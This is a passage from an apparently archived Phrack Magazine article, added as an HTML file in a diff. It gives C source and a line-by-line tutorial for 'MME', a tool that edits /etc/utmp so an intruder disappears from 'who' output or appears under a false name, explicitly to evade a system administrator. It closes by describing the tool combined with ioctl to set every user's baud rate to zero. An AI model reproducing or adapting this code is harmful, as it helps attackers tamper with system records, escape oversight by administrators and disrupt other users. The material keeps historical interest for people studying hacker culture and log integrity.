+        strcpy(mytty,++mytty); /* Make a string starting one pos greater */
+        while (good != 1) {
+                user = getutent();
+                cnt++;
+                if (strcmp(user-&gt;ut_line,mytty) == 0) good =1;
+        }
+        utmpname(&quot;/etc/utmp&quot;); /* Reset file pointer */
+        for(start = 0;start &lt; cnt;start++) {
+                user = getutent(); /* Move the file pointer to where we are */
+        }
+
+
+    if (argc == 1) {
+     user-&gt;ut_type = LOGIN_PROCESS;
+         strcpy(user-&gt;ut_name,&quot;LOGIN&quot;);
+                   }
+    else user-&gt;ut_type = USER_PROCESS;
+
+        if (argc == 2) strcpy(user-&gt;ut_name,argv[1]);
+        pututline(user); /* Rewrite our new info */
+        endutent(); /* Tell the utmp functions we are through */
+        printf(&quot;Delete /tmp/utmp.bak if all is well.\n&quot;);
+        printf(&quot;Else, copy it to /etc/utmp.\n&quot;);
+}
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+
+        Well, of course, we will take this bit by bit.
+        Lets start with the standard ole function:
+
+___
+
+main(argc,argv)
+int argc;
+char *argv[];
+___
+
+        This again sets up main so we can accept command line arguments.
+
+___
+
+char *mytty; /* For an exact match of ut_line */
+char *backup_utmp = &quot;cp /etc/utmp /tmp/utmp.bak&quot;;
+struct utmp *user;
+___
+
+        These are just global variables.
+        Backup_utmp is the command we will issue to shell for a failsafe
+        mechanism.
+
+___
+
+           system(backup_utmp);
+    printf(&quot;Welcome to MME 1.00 By Sir Hackalot\n&quot;);
+    printf(&quot;Another PHAZESOFT Production\n&quot;);
+    printf(&quot;Status:&quot;);
+    if (argc &gt;= 2) printf(&quot;Changing your login to %s\n&quot;,argv[1]);
+        if (argc == 1) printf(&quot;Removing you from utmp\n&quot;);
+___
+
+        The above is not hard to figure out.  First, this uses the system
+        command to load shell, and execute our backup command.
+        Then, the lame credits are printed.  Then, it tells you what it
+        is going to do based on the number of arguments passed from the
+        command line.
+        If no arguments are given (argc==1) then remove us from utmp.
+        If there are 1 or more (arc&gt;=2) then change the login name.
+
+___
+
+utmpname(&quot;/etc/utmp&quot;);
+        mytty = strrchr(ttyname(0),'/'); /* Goto the last &quot;/&quot; */
+        strcpy(mytty,++mytty); /* Make a string starting one pos greater */
+___
+
+        The above code does the following:  utmpname is a system function
+        common to UNIX system V, XENIX system V, etc.  It is part of the
+        utmp reading library.  It sets the thing to be read when the
+        other system calls are made (getutent, etc..).
+        mytty is set to hold one's tty.  It has to break down the result
+        of ttyname(0) to get a ttyname without a path.
+
+___
+
+while (good != 1) {
+                user = getutent();
+                cnt++;
+                if (strcmp(user-&gt;ut_line,mytty) == 0) good =1;
+        }
+___
+
+
+        This code gets your relative index from utmp and stores it into
+        cnt.
+
+___
+
+utmpname(&quot;/etc/utmp&quot;); /* Reset file pointer */
+        for(start = 0;start &lt; cnt;start++) {
+                user = getutent(); /* Move the file pointer to where we are */
+        }
+___
+
+        The above resets the file pointer used by the system calls, then
+        moves to your entry.
+
+___
+
+if (argc == 1) {
+     user-&gt;ut_type = LOGIN_PROCESS;
+         strcpy(user-&gt;ut_name,&quot;LOGIN&quot;);
+                   }
+    else user-&gt;ut_type = USER_PROCESS;
+
+        if (argc == 2) strcpy(user-&gt;ut_name,argv[1]);
+        pututline(user); /* Rewrite our new info */
+        endutent(); /* Tell the utmp functions we are through */
+___
+
+        The above is very simple as well.  If you are removing yourself
+        from utmp, it will change your process type to LOGIN_PROCESS
+        so that when someone does a &quot;who&quot;, you are not there.
+        It changes your login name to LOGIN so if some knowitall
+        system admin does a who -l, he wont see you.  See, who -l shows
+        ttys waiting for login.  SO, if i did not change your tty name,
+        we would see:
+
+        $ who -l
+        LOGIN           ttyxx1
+        LOGIN           tty002
+        joehack         tty003
+        LOGIN           tty004
+
+        See the problem there?  That is why your name needs to be
+        changed to LOGIN.
+        If you are changing your login name, the &quot;else&quot; statment kicks
+        in and makes SURE you WILL show up in utmp, in case you had
+        removed yourself before.
+        Then, it takes the command line argument, and places it as your
+        login name in utmp.
+        pututline(user) then writes the info into the record where the
+        file pointer is... and that is your record.  It puts the contents
+        of the things in the &quot;user&quot; structure into the file.  then, endutent
+        closes the file.
+
+        Now, here is an example of using the file:
+
+        # mme Gh0d
+
+        that would change your login name to Gh0d in utmp.
+
+        # mme
+
+        that would remove you from sight.  Remember!!: You need write perms
+        to utmp for this to work.  You CAN test this program by changing
+        the filename in the function &quot;utmpname&quot; to somewhere else, say in
+        /tmp.  You could copy /etc/utmp to /tmp/utmp, and test it there.
+        Then, you could use &quot;who&quot; to read the file in /tmp to show the
+        results.
+
+_______________________________________________________________________________
+
+
+o In Conclusion:
+  ~~~~~~~~~~~~~~
+
+        These are just some of the programs I decided to put in this file.
+        I have a lot more, but I decided I would keep them for later
+        issues, and leave these two together since they can
+        be easily related.  One person took MBS, and ioctl, and mended
+        them together to make a program that sets everyone's baud
+        rate to zero instead of sending 3 backspaces.  They just put
+        in the above lines of code into the place where they sent
+        the backspaces, and used open instead of stream open (fopen).
+        It is very simple to mend these two things together.
+
+        Have a nice life!  Keep on programmin'!
+
+        By: Sir Hackalot of Phaze.
+_______________________________________________________________________________
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
